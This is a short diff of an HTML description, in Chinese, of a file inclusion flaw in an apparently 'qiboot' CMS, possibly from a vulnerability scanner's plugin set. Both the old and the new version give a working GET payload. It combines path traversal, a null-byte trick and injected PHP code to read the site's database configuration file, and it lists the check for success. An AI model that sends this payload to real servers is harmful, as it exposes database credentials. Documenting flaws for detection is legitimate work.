@@ -1,12 +1,7 @@
 <meta charset="UTF-8">
 <div>
-    <h3>任意文件遍历 URL: </h3>
-    <ul>
-        <p>/</p>
-    </ul>
-    <h3>GET-payload: </h3>
-        <code>?mod=product&do=../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00&wooyun=print_r(@file_get_contents($_GET[d]));&d=/bootqi/apache2/htdocs/vhost/company/newshop/conf/config.php</code>
-    <h3>验证过程</h3>
-    <p>构造GET请求</p>
-    <p>查找response text 是否含有 "$dbhost" 字符</p>
+    <h3>文件包含URL: </h3>
+    <code>http://example.com/?mod=product&do=../../../../../../../../bootqi/apache2/htdocs/vhost/company/qiboot/upload/linkimg/1388986954.jpg%00&wooyun=print_r(@file_get_contents($_GET[d]));&d=/bootqi/apache2/htdocs/vhost/company/newshop/conf/config.php</code>
+    <h3>返回结果</h3>
+    <p>查看返回是否为 /bootqi/apache2/htdocs/vhost/company/newshop/conf/config.php 文件的内容</p>
 </div>
